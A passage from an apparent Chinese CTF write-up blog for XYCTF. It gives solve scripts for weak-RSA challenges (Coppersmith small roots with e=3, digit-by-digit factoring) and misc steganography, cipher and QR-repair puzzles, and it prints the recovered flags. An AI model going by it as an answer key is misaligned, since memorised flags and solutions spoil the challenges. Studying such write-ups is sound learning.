*</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message + <span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment"># 120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"><span class="comment"># 143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相当于已知m低位，用Coppersmith定理可解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">n = <span class="number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line">c = <span class="number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">50</span>):</span><br><span class="line">    low = <span class="built_in">int</span>(hashlib.sha256(<span class="built_in">str</span>(i).encode()).hexdigest(), <span class="number">16</span>)</span><br><span class="line">    m = low + x*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    roots = (m**<span class="number">3</span> - c).monic().small_roots(X=<span class="number">2</span>**(i*<span class="number">8</span>),beta=<span class="number">0.4</span>,epsilon=<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        M = m(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(M))[:i])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># XYCTF&#123;!__d3ng__hu0__1@n__3h@n__Chu__!&#125;</span></span><br></pre></td></tr></table></figure><p>一开始怎么都爆不出来，结果发现是epsilon取大了，还没规定上下界（这个X=X=2**(i*8)就是确定为flag的长度的）,这样就要写m = low + x*2**256。不然会撞上下界</p><h3 id="week2-2">week2</h3><h4 id="Sign1n-Revenge">Sign1n_Revenge</h4><p>和signin一样，不写了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">09</span>c24f8d-dbf8-<span class="number">463</span>b-a16f-<span class="number">3</span>dbc47e4a726&#125;</span><br></pre></td></tr></table></figure><h4 id="happy-to-solve2">happy_to_solve2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;123&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;567&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">            <span class="keyword">return</span> (p,q)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p ,q= get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>这个p和q每一位既然只有3种选择，那就可以从最低位开始爆破出p和q的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 乘积n</span></span><br><span class="line">n = <span class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line">p_values = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>]</span><br><span class="line">q_values = [<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>]</span><br><span class="line"></span><br><span class="line">n_str = <span class="built_in">str</span>(n)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;&#x27;</span></span><br><span class="line">upone = <span class="number">0</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">p, i, digit</span>):</span><br><span class="line">    p_list = <span class="built_in">list</span>(p)</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(p_list):</span><br><span class="line">        p_list[<span class="number">0</span>] = digit</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p_list.insert(<span class="number">0</span>,digit)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(p_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p_q</span>(<span class="params">i, p, q</span>):</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span>)<span class="keyword">or</span>(<span class="built_in">int</span>(p)*<span class="built_in">int</span>(q)==n):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;p:&#x27;</span>, <span class="built_in">int</span>(p))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q:&#x27;</span>, <span class="built_in">int</span>(q))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    j = <span class="built_in">len</span>(n_str) -<span class="number">1</span> -i</span><br><span class="line">    <span class="keyword">for</span> p_val <span class="keyword">in</span> p_values:</span><br><span class="line">        new_p = <span class="built_in">set</span>(p, j, p_val)</span><br><span class="line">        <span class="keyword">for</span> q_val <span class="keyword">in</span> q_values:</span><br><span class="line">            new_q = <span class="built_in">set</span>(q, j, q_val)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">str</span>(<span class="built_in">int</span>(new_q)*<span class="built_in">int</span>(new_p))[-(<span class="number">1</span>+j)]) == n_str[i]:</span><br><span class="line">                <span class="keyword">if</span> find_p_q(i-<span class="number">1</span>, new_p, new_q): <span class="comment"># 向下一层</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># 否则向上一层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> find_p_q(<span class="built_in">len</span>(n_str)-<span class="number">1</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546</span></span><br><span class="line"></span><br><span class="line">Srsa(p,q,e,c)<span class="comment"># 自己写的解密函数</span></span><br><span class="line"><span class="comment"># b&#x27;XYCTF&#123;7f4b2241951976ce5ef6df44503209059997e5085d1bc21f6bef4d9effb29fd0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="MISC">MISC</h2><h3 id="week1-3">week1</h3><h4 id="TCPL">TCPL</h4><p>拖入ida分析，，发现只是异或了i，得到没有替换的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x7F</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0x44</span>, <span class="number">0x5C</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x38</span>, <span class="number">0x52</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x64</span>, <span class="number">0x4C</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0x2A</span>, <span class="number">0x61</span>]</span><br><span class="line">pxor(b)</span><br><span class="line"><span class="comment"># FLAG&#123;PLCT_An4_r1SCv_x1huann1&#125;</span></span><br></pre></td></tr></table></figure><p>把1换成其它值，多试一下</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;PLCT_A<span class="symbol">n4</span>_r<span class="number">0</span>SCv_x<span class="number">0</span>hua<span class="symbol">nn0</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-隐写">ez_隐写</h4><p>开头一个伪加密，改好了之后有一个hint.png和一个watermark.jpg的文件,但是water.jpg要解压,修改hint.png的长宽获得密码xyctf0401，然后解压watermark.jpg，用盲水印工具打开可得flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">758</span>-W5X-IJN-<span class="number">852</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="修仙传">修仙传</h4><h5 id="4元婴">4元婴</h5><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">都<span class="number">2024</span>年了不会还有人解不出U<span class="number">2</span>FsdGVkX<span class="number">1</span>+y<span class="number">2</span>rlJZlJCM<span class="symbol">nvyDwHwzkgHvNsG2</span>TF<span class="number">6</span>sFlBlxBs<span class="number">0</span>w<span class="number">4</span>EmyXdDe<span class="number">6</span>s<span class="number">7</span>viL吧</span><br></pre></td></tr></table></figure><p>key: 2024 TripleDes解密得密码</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_f</span>ourth<span class="number">_f</span>loor<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>okay</span><br></pre></td></tr></table></figure><p>打开文件得到一个微信数据库文件和一个</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wqk：<span class="number">1</span><span class="name">m813</span>o<span class="symbol">nn17</span><span class="meta">o040358</span>p<span class="number">772</span>q<span class="number">37</span>r<span class="name">m137</span>qp<span class="symbol">nqppqpn38</span><span class="symbol">nr704</span><span class="name">m56</span><span class="symbol">n2</span><span class="name">m9</span>q<span class="number">22</span>p<span class="meta">o7</span>r<span class="number">05</span>r<span class="number">77</span></span><br></pre></td></tr></table></figure><p>修改其中的字符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1A813CBB17C040358D772E37FA137EDBEDDEDB38BF704A56B2A9E22DC7F05F77</span><br></pre></td></tr></table></figure><p>直接用脚本解密aes即可</p><p><img src="https://s2.loli.net/2024/04/09/O4jcnmRQfHrpzWU.png" alt="image-20240409192304734"></p><h5 id="7合体">7合体</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：Tig+AF8-viakubq+AF8-vphrz+AF8-xi+AF8-uayzdyrjs</span><br><span class="line"></span><br><span class="line">听说维吉尼亚<span class="built_in">key</span>大残</span><br></pre></td></tr></table></figure><p>放到维吉尼亚解密里面，AF8指密钥和密文长度一样</p><p>假设密钥是ABCDEFGHIJKLMNOPQRST</p><p>得到密码</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_</span>seventh<span class="number">_</span>level<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>difficult</span><br></pre></td></tr></table></figure><p>得到一张颜色图片，8进制转换即可</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">they_were_thr0ugh!</span><br></pre></td></tr></table></figure><h5 id="8大乘">8大乘</h5><p>开头是密码，直接用网上的异或加合脚本爆出来pq</p><p>然后rsa求密码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pruning_algorithm</span></span><br></pre></td></tr></table></figure><p>出来是一个yesno文件</p><p>根据压缩包的提示把yes改成1，no改成0生成图片</p><p>内容是原神的文字，转换</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S<span class="name">m3</span>rt_y<span class="number">0</span>u_ca<span class="symbol">n_do</span></span><br></pre></td></tr></table></figure><h3 id="week3-2">week3</h3><h4 id="我的二维码为啥扫不出来？">我的二维码为啥扫不出来？</h4><p>根据定位点和时序图案还原</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line">import <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">def reverse_color(x):</span><br><span class="line">    <span class="built_in">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span></span><br><span class="line"></span><br><span class="line">def reverse_row_colors(pixels, <span class="built_in">row</span>, <span class="built_in">width</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">width</span> // block_size):</span><br><span class="line">        x = x_block * block_size</span><br><span class="line">        y = <span class="built_in">row</span> * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">def reverse_col_colors(pixels, <span class="built_in">col</span>, <span class="built_in">height</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> y_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">height</span> // block_size):</span><br><span class="line">        x = <span class="built_in">col</span> * block_size</span><br><span class="line">        y = y_block * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">encrypted_img = Image.open(<span class="string">&quot;new.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">decrypted_img = encrypted_img.<span class="built_in">copy</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>, <span class="built_in">height</span> = decrypted_img.size</span><br><span class="line">pixels = decrypted_img.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_row_colors(pixels, <span class="number">1</span>, <span class="built_in">width</span>)</span><br><span class="line">reverse_row_colors(pixels, <span class="number">12</span>, <span class="built_in">width</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_col_colors(pixels, <span class="number">2</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">0</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">5</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">10</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">11</span>, <span class="built_in">height</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypted_img.<span class="built_in">save</span>(<span class="string">&quot;decrypted.png&quot;</span>)</span><br><span class="line"># flag&#123;qR_c0d3_1s_s0_fun&#125;</span><br></pre></td></tr></table></figure><h4 id="Rosk-Paper-Scissors">Rosk,Paper,Scissors!</h4><p>根据看ai的逻辑，发现是检索我出的最多的那个来判断这一次出什么，那就反制这个，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">alist = [] </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_most_count</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = Counter(alist)</span><br><span class="line">        <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = Counter(alist)</span><br><span class="line">            <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Rock&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Paper&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Paper&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;Scissors&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line"><span class="comment"># 创建一个socket对象</span></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到服务器</span></span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化上一次的选择为None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取并打印服务器的欢迎消息</span></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;接收到的数据: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 游戏循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    this_choice = 